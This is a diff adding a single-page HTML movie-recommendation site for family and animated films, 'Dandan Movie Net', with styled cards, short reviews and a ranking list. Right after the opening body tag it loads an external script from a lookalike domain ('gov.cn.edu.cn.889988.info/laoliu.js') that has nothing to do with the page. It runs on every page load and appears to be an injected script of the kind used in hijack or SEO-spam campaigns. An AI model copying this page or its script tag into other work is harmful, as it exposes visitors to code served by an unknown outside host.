@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>蛋蛋电影网 - 圆滚滚看片，破壳即上头 | dandandianyingwang-h5.github.io</title>
+<meta name="description" content="蛋蛋电影网（https://dandandianyingwang-h5.github.io）是圆滚滚观影站：萌系动画、合家欢、轻松喜剧、睡前蛋仔短片、弹幕安利与破壳榜单，不烧脑、不沉重、不费劲。">
+<meta name="keywords" content="蛋蛋电影网,萌系电影,合家欢,轻松喜剧,动画短片,蛋仔影评,破壳榜单,dandandianyingwang-h5.github.io">
+<meta property="og:title" content="蛋蛋电影网 - 圆滚滚看片，破壳即上头">
+<meta property="og:description" content="萌系动画、合家欢、轻松喜剧、睡前蛋仔短片、弹幕安利与破壳榜单。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://dandandianyingwang-h5.github.io">
+<link rel="canonical" href="https://dandandianyingwang-h5.github.io">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --cream:#fff7e6;--cream2:#ffefcf;--yolk:#ffc24b;--yolk2:#ff9e2c;--white:#fffdf8;
+  --shell:#f3e2c0;--ink:#5a4423;--ink2:#8a6c3c;--pink:#ffb3c1;--mint:#bfe9d0;
+  --shadow:0 12px 28px rgba(138,108,60,.22);--radius:30px;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Noto Sans SC","Microsoft YaHei",system-ui,sans-serif;
+  background:
+    radial-gradient(120% 80% at 12% 0%,#fff3d6 0%,transparent 55%),
+    radial-gradient(120% 80% at 100% 8%,#ffe6ef 0%,transparent 50%),
+    var(--cream);
+  color:var(--ink);line-height:1.75;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 18px}
+
+/* 蛋仔漂浮 */
+.eggs-float{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
+.eggs-float i{position:absolute;width:26px;height:34px;border-radius:50% 50% 48% 52%/60% 60% 40% 40%;
+  background:radial-gradient(circle at 32% 28%,#fff,var(--yolk));opacity:.55;animation:bounceUp linear infinite}
+@keyframes bounceUp{0%{transform:translateY(110vh) rotate(0)}100%{transform:translateY(-12vh) rotate(360deg)}}
+
+/* header */
+.site-header{position:sticky;top:0;z-index:60;background:rgba(255,247,230,.88);backdrop-filter:blur(10px);border-bottom:3px dotted var(--yolk2)}
+.nav{display:flex;align-items:center;justify-content:space-between;min-height:64px;gap:10px}
+.brand{display:flex;align-items:center;gap:10px;font-weight:900;font-size:1.25rem;letter-spacing:1px}
+.egg-ico{width:38px;height:46px;border-radius:50% 50% 47% 53%/58% 58% 42% 42%;
+  background:radial-gradient(circle at 35% 30%,#fff7e6,var(--yolk) 70%,var(--yolk2));
+  box-shadow:inset 0 0 0 2px #fff,0 6px 14px rgba(255,158,44,.45);display:grid;place-items:center;font-size:1.1rem}
+.brand b{color:var(--yolk2)}
+.navlinks{display:flex;gap:6px;flex-wrap:wrap}
+.navlinks a{padding:8px 14px;border-radius:999px;font-size:.85rem;font-weight:700;color:var(--ink2);transition:.2s;border:1px solid transparent}
+.navlinks a:hover,.navlinks a.active{background:#fff;color:var(--yolk2);border-color:var(--yolk);box-shadow:var(--shadow)}
+.burger{display:none;flex-direction:column;gap:5px;cursor:pointer}
+.burger span{width:24px;height:3px;background:var(--ink);border-radius:3px}
+
+/* hero */
+.hero{position:relative;z-index:1;padding:54px 0 32px;text-align:center}
+.hero .pill{display:inline-block;padding:6px 16px;border-radius:999px;background:#fff;border:1px dashed var(--yolk2);color:var(--yolk2);font-size:.75rem;font-weight:800;margin-bottom:18px}
+.hero h1{font-size:clamp(2rem,6vw,3.4rem);line-height:1.12;font-weight:900}
+.hero h1 em{font-style:normal;color:var(--yolk2)}
+.hero p{max-width:580px;margin:16px auto 26px;color:var(--ink2)}
+.cta{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.btn{padding:12px 26px;border-radius:999px;font-weight:800;font-size:.9rem;cursor:pointer;border:0;transition:.25s}
+.btn-yolk{background:linear-gradient(135deg,var(--yolk),var(--yolk2));color:#fff7e6;box-shadow:0 10px 24px rgba(255,158,44,.45)}
+.btn-yolk:hover{transform:translateY(-3px)}
+.btn-white{background:#fff;color:var(--ink);box-shadow:var(--shadow)}
+.btn-white:hover{transform:translateY(-3px)}
+
+/* big egg mascot */
+.mascot{width:120px;height:150px;margin:0 auto 18px;border-radius:50% 50% 46% 54%/56% 56% 44% 44%;
+  background:radial-gradient(circle at 36% 28%,#fff,var(--yolk) 68%,var(--yolk2));
+  box-shadow:inset 0 0 0 4px #fff,0 18px 40px rgba(255,158,44,.4);position:relative;animation:wobble 3s ease-in-out infinite}
+.mascot::before{content:'';position:absolute;left:28px;top:46px;width:16px;height:20px;border-radius:50%;background:#3a2c16;box-shadow:54px 0 0 #3a2c16}
+.mascot::after{content:'';position:absolute;left:50%;top:84px;width:26px;height:12px;border-radius:999px;transform:translateX(-50%);background:#c8533a;opacity:.7}
+@keyframes wobble{0%,100%{transform:rotate(-3deg)}50%{transform:rotate(3deg)}}
+
+section.block{padding:46px 0;position:relative;z-index:1}
+.sec-head{display:flex;align-items:center;gap:12px;margin-bottom:24px}
+.sec-head .eggmini{width:32px;height:40px;border-radius:50% 50% 48% 52%/58% 58% 42% 42%;background:radial-gradient(circle at 35% 30%,#fff,var(--pink));display:grid;place-items:center;font-size:1rem;box-shadow:inset 0 0 0 2px #fff}
+.sec-head h2{font-size:1.45rem;font-weight:900;letter-spacing:1px}
+.sec-head .tag{margin-left:auto;font-size:.73rem;color:var(--ink2);background:#fff;padding:5px 12px;border-radius:999px;box-shadow:var(--shadow)}
+
+/* 1 萌系动画：蛋卡 */
+.egg-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.egg-card{background:var(--white);border-radius:var(--radius);padding:18px;text-align:center;box-shadow:var(--shadow);opacity:0;transform:translateY(18px) rotate(-1deg);transition:.55s;position:relative;overflow:hidden}
+.egg-card.in{opacity:1;transform:none}
+.egg-card:hover{transform:translateY(-6px) rotate(1deg)}
+.egg-card .oval{width:74px;height:92px;margin:0 auto 10px;border-radius:50% 50% 47% 53%/56% 56% 44% 44%;
+  background:radial-gradient(circle at 34% 28%,#fff,var(--yolk) 70%,var(--yolk2));display:grid;place-items:center;font-size:2rem;box-shadow:inset 0 0 0 3px #fff}
+.egg-card h3{font-size:1rem;font-weight:800;margin-bottom:4px}
+.egg-card p{font-size:.77rem;color:var(--ink2);line-height:1.55}
+.egg-card .chip{position:absolute;top:12px;right:12px;background:var(--mint);color:var(--ink);font-size:.66rem;font-weight:800;padding:3px 9px;border-radius:999px}
+
+/* 2 合家欢：摇摇行 */
+.shake-row{display:flex;gap:16px;overflow-x:auto;padding:6px 2px 20px;scroll-snap-type:x mandatory}
+.shake-row::-webkit-scrollbar{height:8px}
+.shake-row::-webkit-scrollbar-thumb{background:var(--yolk);border-radius:99px}
+.shake{flex:0 0 250px;scroll-snap-align:start;background:var(--white);border-radius:24px;padding:18px;box-shadow:var(--shadow);opacity:0;transform:scale(.94);transition:.5s}
+.shake.in{opacity:1;transform:none}
+.shake .face{height:104px;border-radius:18px;background:linear-gradient(135deg,var(--pink),#ffe1ea);display:grid;place-items:center;font-size:2.4rem;margin-bottom:10px;animation:wiggle 2.4s ease-in-out infinite}
+@keyframes wiggle{0%,100%{transform:rotate(-4deg)}50%{transform:rotate(4deg)}}
+.shake h4{font-size:.95rem;font-weight:800}
+.shake p{font-size:.74rem;color:var(--ink2)}
+
+/* 3 轻松喜剧：蛋仔弹幕 */
+.chat-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+.dm{background:var(--white);border-radius:20px;padding:16px 18px;box-shadow:var(--shadow);opacity:0;transform:translateX(-16px);transition:.5s;position:relative}
+.dm.in{opacity:1;transform:none}
+.dm:nth-child(even){transform:translateX(16px)}
+.dm:nth-child(even).in{transform:none}
+.dm .who{font-size:.78rem;font-weight:800;color:var(--yolk2);margin-bottom:6px}
+.dm .bubble{background:#fff;border:1px solid rgba(138,108,60,.18);border-radius:6px 16px 16px 16px;padding:10px 14px;font-size:.84rem;color:var(--ink)}
+.dm .bubble b{color:var(--yolk2)}
+
+/* 4 睡前蛋仔短片：月亮窝 */
+.nest{max-width:840px;margin:0 auto}
+.nest-row{display:flex;align-items:center;gap:16px;background:linear-gradient(90deg,var(--white),#fff7e6);border-radius:18px;padding:14px 18px;margin-bottom:12px;box-shadow:var(--shadow);opacity:0;transform:translateY(14px);transition:.5s}
+.nest-row.in{opacity:1;transform:none}
+.nest-row .yolko{width:46px;height:46px;border-radius:50%;background:radial-gradient(circle at 35% 30%,#fff,var(--yolk));box-shadow:0 0 16px rgba(255,194,75,.7);display:grid;place-items:center;font-size:1.3rem;flex-shrink:0}
+.nest-row .info{flex:1}
+.nest-row h4{font-size:.92rem;font-weight:800}
+.nest-row p{font-size:.76rem;color:var(--ink2)}
+.nest-row .len{font-size:.72rem;font-weight:800;color:var(--ink2);background:#fff;padding:4px 10px;border-radius:999px;box-shadow:inset 0 0 0 1px rgba(138,108,60,.2)}
+
+/* 5 蛋仔影评：贴纸墙 */
+.wall{column-count:3;column-gap:18px}
+.sticker{break-inside:avoid;background:var(--white);border-radius:18px;padding:16px;margin-bottom:18px;box-shadow:var(--shadow);position:relative;opacity:0;transform:rotate(-2deg);transition:.5s}
+.sticker.in{opacity:1;transform:rotate(0)}
+.sticker .pin{position:absolute;top:-9px;left:50%;transform:translateX(-50%) rotate(-6deg);width:18px;height:18px;border-radius:50%;background:var(--pink);box-shadow:0 3px 6px rgba(0,0,0,.15)}
+.sticker h4{font-size:.9rem;font-weight:800;margin:6px 0 6px}
+.sticker p{font-size:.78rem;color:var(--ink2);line-height:1.6}
+.sticker .stars{color:var(--yolk2);font-size:.82rem;margin-top:8px}
+
+/* 6 破壳榜单 */
+.crack{max-width:760px;margin:0 auto}
+.crack-row{display:flex;align-items:center;gap:14px;background:var(--white);border-radius:16px;padding:12px 16px;margin-bottom:10px;box-shadow:var(--shadow);opacity:0;transform:translateX(14px);transition:.45s}
+.crack-row.in{opacity:1;transform:none}
+.crack-row .shellno{width:36px;height:36px;border-radius:50% 50% 45% 55%;background:var(--yolk);color:#fff7e6;font-weight:900;display:grid;place-items:center;flex-shrink:0;box-shadow:inset 0 0 0 2px #fff}
+.crack-row:nth-child(1) .shellno{background:var(--pink)}
+.crack-row .ttl{flex:1;font-weight:800;font-size:.9rem}
+.crack-row .score{font-weight:900;color:var(--yolk2);font-family:ui-monospace,monospace}
+
+footer.site-foot{margin-top:40px;background:linear-gradient(180deg,transparent,var(--cream2));border-top:3px dotted var(--yolk2);padding:34px 0 22px;position:relative;z-index:1}
+.foot-brand{font-weight:900;font-size:1.2rem;text-align:center;margin-bottom:12px}
+.foot-brand b{color:var(--yolk2)}
+.foot-links{display:flex;flex-wrap:wrap;justify-content:center;gap:14px;margin-bottom:14px}
+.foot-links a{font-size:.8rem;color:var(--ink2)}
+.foot-links a:hover{color:var(--yolk2)}
+.foot-small{text-align:center;font-size:.74rem;color:var(--ink2);line-height:1.7}
+
+@media(max-width:960px){.egg-grid{grid-template-columns:repeat(2,1fr)}.wall{column-count:2}}
+@media(max-width:680px){
+  .navlinks{position:fixed;top:64px;left:12px;right:12px;flex-direction:column;background:#fff;border-radius:18px;padding:10px;box-shadow:var(--shadow);transform:translateY(-180%);transition:.3s}
+  .navlinks.open{transform:none}
+  .burger{display:flex}
+  .chat-grid{grid-template-columns:1fr}
+  .wall{column-count:1}
+}
+@media(max-width:420px){.egg-grid{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="eggs-float" id="eggs"></div>
+
+<div class="wrap">
+  <header class="site-header">
+    <div class="nav">
+      <div class="brand"><span class="egg-ico">🥚</span>蛋蛋<b>电影网</b></div>
+      <nav class="navlinks" id="nav">
+        <a href="#cute" class="active">萌系动画</a>
+        <a href="#family">合家欢</a>
+        <a href="#comedy">轻松喜剧</a>
+        <a href="#sleep">睡前蛋仔</a>
+        <a href="#wall">蛋仔影评</a>
+        <a href="#crack">破壳榜单</a>
+      </nav>
+      <div class="burger" id="burger"><span></span><span></span><span></span></div>
+    </div>
+  </header>
+
+  <main>
+    <!-- hero -->
+    <section class="hero">
+      <div class="mascot"></div>
+      <span class="pill">🥚 圆滚滚 · 不烧脑 · 破壳即上头</span>
+      <h1>像蛋仔一样<br>滚进<em>好电影</em></h1>
+      <p>蛋蛋电影网（dandandianyingwang-h5.github.io）是圆滚滚观影站：萌系动画、合家欢、轻松喜剧、睡前蛋仔短片、弹幕安利与破壳榜单，不沉重，刚刚好。</p>
+      <div class="cta">
+        <a href="#cute" class="btn btn-yolk">今天滚哪部</a>
+        <a href="#sleep" class="btn btn-white">睡前来一颗</a>
+      </div>
+    </section>
+
+    <!-- 1 萌系动画 -->
+    <section class="block" id="cute">
+      <div class="sec-head"><span class="eggmini">🐣</span><h2>萌系动画 · 蛋卡</h2><span class="tag">适合小朋友 + 大朋友</span></div>
+      <div class="egg-grid">
+        <article class="egg-card"><div class="oval">🐤</div><span class="chip">软萌</span><h3>小鸡快跑</h3><p>鸡舍起义、越狱计划，圆滚滚的角色每一步都可爱到犯规。</p></article>
+        <article class="egg-card"><div class="oval">🐉</div><span class="chip">国漫</span><h3>大鱼海棠</h3><p>鲲、海棠、土楼，把东方神话拍成了会呼吸的梦。</p></article>
+        <article class="egg-card"><div class="oval">🐱</div><span class="chip">治愈</span><h3>猫的报恩</h3><p>被猫王国请去当公主，吉卜力式小冒险，看完心里软乎乎。</p></article>
+        <article class="egg-card"><div class="oval">🐰</div><span class="chip">低龄不低智</span><h3>比得兔</h3><p>菜园大战老麦格雷戈，捣蛋兔子的英式幽默很上头。</p></article>
+        <article class="egg-card"><div class="oval">🐧</div><span class="chip">合家欢</span><h3>马达加斯加</h3><p>动物园四傻流落荒岛，企鹅永远是最大反派兼顶流。</p></article>
+        <article class="egg-card"><div class="oval">🧚</div><span class="chip">梦幻</span><h3>借东西的小人阿莉埃蒂</h3><p>地板下的小人族，宫崎骏式温柔，连借块方糖都像偷心。</p></article>
+        <article class="egg-card"><div class="oval">🐻</div><span class="chip">治愈</span><h3>熊出没·重返地球</h3><p>熊大熊二也能上太空，国产合家欢现在真的很会整活。</p></article>
+        <article class="egg-card"><div class="oval">🐸</div><span class="chip">怪萌</span><h3>蛙哥历险记</h3><p>小成本定格动画，青蛙坐树叶漂流，慢得刚刚好。</p></article>
+      </div>
+    </section>
+
+    <!-- 2 合家欢 -->
+    <section class="block" id="family">
+      <div class="sec-head"><span class="eggmini">🪺</span><h2>合家欢 · 摇摇片</h2><span class="tag">横着滑 · 全家一起看</span></div>
+      <div class="shake-row">
+        <div class="shake"><div class="face">🎠</div><h4>欢乐好声音</h4><p>考拉开剧院、猪妈妈唱摇滚，全家都能在片里找到自己。</p></div>
+        <div class="shake"><div class="face">🚂</div><h4>帕丁顿熊</h4><p>秘鲁小熊闯伦敦，礼貌、果酱、红帽子，绅士到犯规。</p></div>
+        <div class="shake"><div class="face">🦄</div><h4>我的小马驹</h4><p>友谊魔法不幼稚，颜色甜、歌词洗脑、道理不硬塞。</p></div>
+        <div class="shake"><div class="face">🐘</div><h4>大象席地而坐？不，是《大象出逃》</h4><p>马戏团大象带小象跑路，真实事件改编，笑里带泪。</p></div>
+        <div class="shake"><div class="face">🧸</div><h4>玩具总动员</h4><p>胡迪和巴斯光年，成年人的童年债，看一次还一次。</p></div>
+        <div class="shake"><div class="face">🐶</div><h4>狗狗的疯狂假期</h4><p>看家狗以为自己拯救世界，笑点密得像爆米花。</p></div>
+      </div>
+    </section>
+
+    <!-- 3 轻松喜剧 -->
+    <section class="block" id="comedy">
+      <div class="sec-head"><span class="eggmini">🥚</span><h2>轻松喜剧 · 蛋仔弹幕</h2><span class="tag">不烧脑 · 笑完就睡</span></div>
+      <div class="chat-grid">
+        <div class="dm"><div class="who">@蛋仔阿黄</div><div class="bubble">《<b>疯狂动物城</b>》狐狸卖驾照那段我笑出鹅叫，树懒办业务更是灵魂共鸣 🦥</div></div>
+        <div class="dm"><div class="who">@破壳少女</div><div class="bubble">《<b>白日梦想家</b>》滑板那段直接上头，社恐看完想立刻辞职去冰岛。</div></div>
+        <div class="dm"><div class="who">@蛋黄哥</div><div class="bubble">《<b>布达佩斯大饭店</b>》配色太甜了，像把马卡龙直接拍成电影。</div></div>
+        <div class="dm"><div class="who">@圆圆</div><div class="bubble">《<b>怦然心动</b>》看完整个人变成小学生，梧桐树真的会发光。</div></div>
+      </div>
+    </section>
+
+    <!-- 4 睡前蛋仔短片 -->
+    <section class="block" id="sleep">
+      <div class="sec-head"><span class="eggmini">🌙</span><h2>睡前蛋仔 · 月亮窝</h2><span class="tag">15 分钟内 · 关灯看</span></div>
+      <div class="nest">
+        <div class="nest-row"><div class="yolko">🕯️</div><div class="info"><h4>一盏蛋的光</h4><p>小蛋仔提着灯找妈妈，全片没几句台词，结尾会鼻酸。</p></div><div class="len">07 min</div></div>
+        <div class="nest-row"><div class="yolko">🐌</div><div class="info"><h4>慢吞吞快递</h4><p>蜗牛送一颗星星，路上睡了三次，刚好适合失眠的人。</p></div><div class="len">11 min</div></div>
+        <div class="nest-row"><div class="yolko">🧦</div><div class="info"><h4>走丢的袜子</h4><p>洗衣房微型冒险，最后两只袜子在风里碰头。</p></div><div class="len">06 min</div></div>
+        <div class="nest-row"><div class="yolko">🌧️</div><div class="info"><h4>雨停之前</h4><p>便利店店员给流浪猫撑伞，陌生人之间的善意很轻。</p></div><div class="len">13 min</div></div>
+        <div class="nest-row"><div class="yolko">🪐</div><div class="info"><h4>晚安，地球蛋</h4><p>外星蛋来地球只为了听人打呼噜，怪萌怪萌的。</p></div><div class="len">09 min</div></div>
+      </div>
+    </section>
+
+    <!-- 5 蛋仔影评 -->
+    <section class="block" id="wall">
+      <div class="sec-head"><span class="eggmini">📌</span><h2>蛋仔影评 · 贴纸墙</h2><span class="tag">一句话，不装深度</span></div>
+      <div class="wall">
+        <div class="sticker"><div class="pin"></div><h4>《小鸡快跑》</h4><p>“母鸡越狱”这四个字就够了，看完想给家里鸡舍敬个礼。</p><div class="stars">★★★★★</div></div>
+        <div class="sticker"><div class="pin"></div><h4>《大鱼海棠》</h4><p>椿去湫来，土楼像被海水泡过的梦，配乐一响鸡皮疙瘩。</p><div class="stars">★★★★☆</div></div>
+        <div class="sticker"><div class="pin"></div><h4>《帕丁顿熊》</h4><p>“请照顾好你的果酱”，英式礼貌是成年人最后的盔甲。</p><div class="stars">★★★★★</div></div>
+        <div class="sticker"><div class="pin"></div><h4>《玩具总动员》</h4><p>胡迪说“去吧”，我就破了。童年债，迟早要还。</p><div class="stars">★★★★★</div></div>
+        <div class="sticker"><div class="pin"></div><h4>《借东西的小人》</h4><p>阿莉埃蒂在地板下点蜡烛，那一帧我能当壁纸用三年。</p><div class="stars">★★★★☆</div></div>
+        <div class="sticker"><div class="pin"></div><h4>《欢乐好声音》</h4><p>猪妈妈唱摇滚那一刻，全职妈妈们的眼泪是甜的。</p><div class="stars">★★★★★</div></div>
+      </div>
+    </section>
+
+    <!-- 6 破壳榜单 -->
+    <section class="block" id="crack">
+      <div class="sec-head"><span class="eggmini">🥚</span><h2>破壳榜单 · 本周最圆</h2><span class="tag">蛋仔用户投票</span></div>
+      <div class="crack">
+        <div class="crack-row"><div class="shellno">1</div><div class="ttl">小鸡快跑</div><div class="score">9.6</div></div>
+        <div class="crack-row"><div class="shellno">2</div><div class="ttl">帕丁顿熊</div><div class="score">9.5</div></div>
+        <div class="crack-row"><div class="shellno">3</div><div class="ttl">大鱼海棠</div><div class="score">9.3</div></div>
+        <div class="crack-row"><div class="shellno">4</div><div class="ttl">玩具总动员</div><div class="score">9.4</div></div>
+        <div class="crack-row"><div class="shellno">5</div><div class="ttl">借东西的小人阿莉埃蒂</div><div class="score">9.2</div></div>
+        <div class="crack-row"><div class="shellno">6</div><div class="ttl">欢乐好声音</div><div class="score">9.1</div></div>
+        <div class="crack-row"><div class="shellno">7</div><div class="ttl">猫的报恩</div><div class="score">9.0</div></div>
+        <div class="crack-row"><div class="shellno">8</div><div class="ttl">马达加斯加</div><div class="score">8.9</div></div>
+      </div>
+    </section>
+  </main>
+</div>
+
+<footer class="site-foot">
+  <div class="wrap">
+    <div class="foot-brand">蛋蛋<b>电影网</b> 🥚</div>
+    <div class="foot-links">
+      <a href="#cute">萌系动画</a>
+      <a href="#family">合家欢</a>
+      <a href="#comedy">轻松喜剧</a>
+      <a href="#sleep">睡前蛋仔</a>
+      <a href="#wall">蛋仔影评</a>
+      <a href="#crack">破壳榜单</a>
+      <a href="#">关于蛋蛋</a>
+      <a href="#">投喂片单</a>
+    </div>
+    <div class="foot-small">
+      网站名称：蛋蛋电影网 ｜ 网站网址：https://dandandianyingwang-h5.github.io<br>
+      圆滚滚观影站：萌系动画、合家欢、轻松喜剧、睡前蛋仔短片、蛋仔影评与破壳榜单。<br>
+      © 2026 蛋蛋电影网 保留所有权利。单页演示，内页链接均以 # 占位。
+    </div>
+  </div>
+</footer>
+
+<script>
+// 蛋仔漂浮
+(function(){
+  const box=document.getElementById('eggs');
+  for(let i=0;i<16;i++){
+    const e=document.createElement('i');
+    e.style.left=Math.random()*100+'vw';
+    e.style.animationDuration=(9+Math.random()*12)+'s';
+    e.style.animationDelay=(-Math.random()*20)+'s';
+    e.style.transform='scale('+(0.7+Math.random()*0.8)+')';
+    box.appendChild(e);
+  }
+})();
+
+// 移动端菜单
+const burger=document.getElementById('burger');
+const nav=document.getElementById('nav');
+burger.addEventListener('click',()=>nav.classList.toggle('open'));
+nav.querySelectorAll('a').forEach(a=>a.addEventListener('click',()=>nav.classList.remove('open')));
+
+// 导航高亮
+const secs=[...document.querySelectorAll('main section[id]')];
+const links=[...document.querySelectorAll('.navlinks a')];
+addEventListener('scroll',()=>{
+  const y=scrollY+120;let id='';
+  secs.forEach(s=>{if(s.offsetTop<=y)id=s.id;});
+  links.forEach(a=>a.classList.toggle('active',a.getAttribute('href')==='#'+id));
+});
+
+// 进场动画
+const io=new IntersectionObserver((es)=>{
+  es.forEach(e=>{if(e.isIntersecting){e.target.classList.add('in');io.unobserve(e.target);}});
+},{threshold:.12});
+document.querySelectorAll('.egg-card,.shake,.dm,.nest-row,.sticker,.crack-row').forEach(el=>io.observe(el));
+</script>
+</body>
+</html>
